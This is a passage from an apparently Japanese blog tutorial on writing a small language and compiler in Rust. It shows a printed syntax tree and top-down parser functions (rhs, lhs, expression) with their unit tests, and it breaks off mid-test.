<p>ちなみにこのデータ型は <a href="https://doc.rust-lang.org/std/fmt/trait.Debug.html"><code>Debug</code></a> trait を <code>derive</code> しているので、<a href="https://doc.rust-lang.org/std/macro.println.html"><code>println!</code></a> などに渡すフォーマットに <code>{:#?}</code> を指定するといい感じに表示できたりします。便利。</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb28-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="pp">println!</span>(<span class="st">&quot;{:#?}&quot;</span><span class="op">,</span> tree)<span class="op">;</span></span></code></pre></div>
<div class="sourceCode" id="cb29"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb29-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-1" aria-hidden="true" tabindex="-1"></a>Statements(</span>
<span id="cb29-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-2" aria-hidden="true" tabindex="-1"></a>    Statements(</span>
<span id="cb29-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-3" aria-hidden="true" tabindex="-1"></a>        Statement(</span>
<span id="cb29-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-4" aria-hidden="true" tabindex="-1"></a>            Expression(</span>
<span id="cb29-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-5" aria-hidden="true" tabindex="-1"></a>                AssignAdd(</span>
<span id="cb29-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-6" aria-hidden="true" tabindex="-1"></a>                    Dereference(</span>
<span id="cb29-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-7" aria-hidden="true" tabindex="-1"></a>                        <span class="st">&quot;ptr&quot;</span><span class="op">,</span></span>
<span id="cb29-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-8" aria-hidden="true" tabindex="-1"></a>                    )<span class="op">,</span></span>
<span id="cb29-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-9" aria-hidden="true" tabindex="-1"></a>                    Number(</span>
<span id="cb29-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-10" aria-hidden="true" tabindex="-1"></a>                        <span class="dv">65</span><span class="op">,</span></span>
<span id="cb29-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-11" aria-hidden="true" tabindex="-1"></a>                    )<span class="op">,</span></span>
<span id="cb29-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-12" aria-hidden="true" tabindex="-1"></a>                )<span class="op">,</span></span>
<span id="cb29-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-13" aria-hidden="true" tabindex="-1"></a>            )<span class="op">,</span></span>
<span id="cb29-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-14" aria-hidden="true" tabindex="-1"></a>        )<span class="op">,</span></span>
<span id="cb29-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-15" aria-hidden="true" tabindex="-1"></a>        Expression(</span>
<span id="cb29-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-16" aria-hidden="true" tabindex="-1"></a>            FunctionCall(</span>
<span id="cb29-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-17" aria-hidden="true" tabindex="-1"></a>                <span class="bu">Pointer</span>(</span>
<span id="cb29-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-18" aria-hidden="true" tabindex="-1"></a>                    <span class="st">&quot;putchar&quot;</span><span class="op">,</span></span>
<span id="cb29-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-19" aria-hidden="true" tabindex="-1"></a>                )<span class="op">,</span></span>
<span id="cb29-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-20" aria-hidden="true" tabindex="-1"></a>            )<span class="op">,</span></span>
<span id="cb29-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-21" aria-hidden="true" tabindex="-1"></a>        )<span class="op">,</span></span>
<span id="cb29-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-22" aria-hidden="true" tabindex="-1"></a>    )<span class="op">,</span></span>
<span id="cb29-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb29-23" aria-hidden="true" tabindex="-1"></a>)</span></code></pre></div>
<h3 id="top-down-型の構文解析を実装する">Top-Down 型の構文解析を実装する</h3>
<p>では実際に構文解析を実装していきます。今回は比較的お手軽に実装できる Top-Down<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> (下降、下向き などと訳される) 型の構文解析を実装します。</p>
<p><code>src/parser.rs</code> に、まず <code>rhs</code> を認識する関数 <code>rhs()</code> をこんな感じに実装してみました。この関数は注目しているトークン列 <code>tokens</code> を受け取り、<code>rhs</code> の文法にマッチしていたらその結果と残りのトークン列を返すというものです。</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb30-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> rhs(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Rhs)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb30-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-2" aria-hidden="true" tabindex="-1"></a>    tokens<span class="op">.</span>first()<span class="op">.</span>and_then(<span class="op">|</span>t<span class="op">|</span> <span class="cf">match</span> t <span class="op">{</span></span>
<span id="cb30-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-3" aria-hidden="true" tabindex="-1"></a>        <span class="co">// トークン列の先頭が Token::Integer だったら Rhs::Number</span></span>
<span id="cb30-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-4" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Token::</span>Integer(i) <span class="op">=&gt;</span> <span class="cn">Some</span>((<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="op">*</span>i)))<span class="op">,</span></span>
<span id="cb30-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-5" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">None</span><span class="op">,</span></span>
<span id="cb30-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>)</span>
<span id="cb30-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb30-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb30-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_rhs() <span class="op">{</span></span>
<span id="cb30-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-11" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(rhs(<span class="op">&amp;</span>[])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb30-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-12" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(rhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>CurlyOpen])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb30-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-13" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(rhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>Identifier(<span class="st">&quot;123&quot;</span><span class="op">.</span>to_owned())])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb30-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-14" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb30-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-15" aria-hidden="true" tabindex="-1"></a>        rhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>Integer(<span class="dv">123</span>)])<span class="op">,</span></span>
<span id="cb30-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-16" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((<span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>)))</span>
<span id="cb30-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-17" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb30-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb30-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>同様に <code>lhs</code> を認識する関数 <code>lhs()</code> はこんな感じです。ここまではまぁそのままって感じですね。</p>
<div class="sourceCode" id="cb31"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb31-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> lhs(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Lhs)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb31-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// トークン列の先頭2要素が</span></span>
<span id="cb31-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> (tokens<span class="op">.</span>get(<span class="dv">0</span>)<span class="op">,</span> tokens<span class="op">.</span>get(<span class="dv">1</span>)) <span class="op">{</span></span>
<span id="cb31-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-4" aria-hidden="true" tabindex="-1"></a>        <span class="co">// [Token::Star, Token::Identifier, ...] だったら Lhs::Dereference</span></span>
<span id="cb31-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-5" aria-hidden="true" tabindex="-1"></a>        (<span class="cn">Some</span>(<span class="pp">Token::</span>Star)<span class="op">,</span> <span class="cn">Some</span>(<span class="pp">Token::</span>Identifier(s))) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb31-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-6" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Some</span>((<span class="op">&amp;</span>tokens[<span class="dv">2</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Lhs::</span>Dereference(s<span class="op">.</span>to_string())))</span>
<span id="cb31-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb31-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// [Token::Identifier, ...] だったら Lhs::Pointer</span></span>
<span id="cb31-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-10" aria-hidden="true" tabindex="-1"></a>        (<span class="cn">Some</span>(<span class="pp">Token::</span>Identifier(s))<span class="op">,</span> _) <span class="op">=&gt;</span> <span class="cn">Some</span>((<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Lhs::</span><span class="bu">Pointer</span>(s<span class="op">.</span>to_string())))<span class="op">,</span></span>
<span id="cb31-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-12" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">None</span><span class="op">,</span></span>
<span id="cb31-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb31-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb31-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-16" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb31-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-17" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_lhs() <span class="op">{</span></span>
<span id="cb31-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-18" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(lhs(<span class="op">&amp;</span>[])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb31-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-19" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(lhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>CurlyOpen])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb31-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-20" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(lhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>Integer(<span class="dv">123</span>)])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb31-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-21" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb31-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-22" aria-hidden="true" tabindex="-1"></a>        lhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())])<span class="op">,</span></span>
<span id="cb31-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-23" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((<span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span> <span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())))</span>
<span id="cb31-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-24" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb31-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-25" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb31-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-26" aria-hidden="true" tabindex="-1"></a>        lhs(<span class="op">&amp;</span>[<span class="pp">Token::</span>Star<span class="op">,</span> <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())])<span class="op">,</span></span>
<span id="cb31-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-27" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((<span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span> <span class="pp">Lhs::</span>Dereference(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())))</span>
<span id="cb31-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-28" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb31-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb31-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>この方式で実装する構文解析のおもしろいところは、別の構文解析の関数を組み合わせてより複雑な構文解析を実装できるところです。例えば <code>expression</code> を認識する関数 <code>expression()</code> は <code>rhs()</code> と <code>lhs()</code> を組み合わせてこんな感じに実装できます。</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb32-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> expression(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Expression)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb32-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// lhs が認識できるかチェックし、その後に続くトークン列が</span></span>
<span id="cb32-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-3" aria-hidden="true" tabindex="-1"></a>    lhs(tokens)<span class="op">.</span>and_then(<span class="op">|</span>(tokens<span class="op">,</span> l)<span class="op">|</span> <span class="cf">match</span> (tokens<span class="op">.</span>get(<span class="dv">0</span>)<span class="op">,</span> tokens<span class="op">.</span>get(<span class="dv">1</span>)) <span class="op">{</span></span>
<span id="cb32-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-4" aria-hidden="true" tabindex="-1"></a>        <span class="co">// '+=' かつその後に rhs が続いたら Expression::AssignAdd</span></span>
<span id="cb32-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-5" aria-hidden="true" tabindex="-1"></a>        (<span class="cn">Some</span>(<span class="pp">Token::</span>PlusEq)<span class="op">,</span> _) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb32-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-6" aria-hidden="true" tabindex="-1"></a>            rhs(<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>])<span class="op">.</span>map(<span class="op">|</span>(t<span class="op">,</span> r)<span class="op">|</span> (t<span class="op">,</span> <span class="pp">Expression::</span>AssignAdd(l<span class="op">,</span> r)))</span>
<span id="cb32-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb32-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// '-=' かつその後に rhs が続いたら Expression::AssignSub</span></span>
<span id="cb32-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-10" aria-hidden="true" tabindex="-1"></a>        (<span class="cn">Some</span>(<span class="pp">Token::</span>MinusEq)<span class="op">,</span> _) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb32-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-11" aria-hidden="true" tabindex="-1"></a>            rhs(<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>])<span class="op">.</span>map(<span class="op">|</span>(t<span class="op">,</span> r)<span class="op">|</span> (t<span class="op">,</span> <span class="pp">Expression::</span>AssignSub(l<span class="op">,</span> r)))</span>
<span id="cb32-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb32-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-14" aria-hidden="true" tabindex="-1"></a>        <span class="co">// '(' ')' なら Expression::FunctionCall</span></span>
<span id="cb32-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-15" aria-hidden="true" tabindex="-1"></a>        (<span class="cn">Some</span>(<span class="pp">Token::</span>ParenOpen)<span class="op">,</span> <span class="cn">Some</span>(<span class="pp">Token::</span>ParenClose)) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb32-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-16" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Some</span>((<span class="op">&amp;</span>tokens[<span class="dv">2</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Expression::</span>FunctionCall(l)))</span>
<span id="cb32-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb32-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-19" aria-hidden="true" tabindex="-1"></a>        <span class="co">// それ以外なら Expression::Lhs</span></span>
<span id="cb32-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-20" aria-hidden="true" tabindex="-1"></a>        _ <span class="op">=&gt;</span> <span class="cn">Some</span>((tokens<span class="op">,</span> <span class="pp">Expression::</span>Lhs(l)))<span class="op">,</span></span>
<span id="cb32-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>)</span>
<span id="cb32-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb32-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-24" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb32-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-25" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_expression() <span class="op">{</span></span>
<span id="cb32-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-26" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(expression(<span class="op">&amp;</span>[])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb32-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-28" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-29" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[<span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())])<span class="op">,</span></span>
<span id="cb32-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-30" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-31" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-32" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>Lhs(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned()))</span>
<span id="cb32-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-33" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-34" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-35" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-36" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[<span class="pp">Token::</span>Star<span class="op">,</span> <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())])<span class="op">,</span></span>
<span id="cb32-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-37" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-38" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-39" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>Lhs(<span class="pp">Lhs::</span>Dereference(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned()))</span>
<span id="cb32-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-40" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-41" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-42" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-43" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-44" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-45" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())</span>
<span id="cb32-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-46" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-47"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-47" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-48"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-48" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[<span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
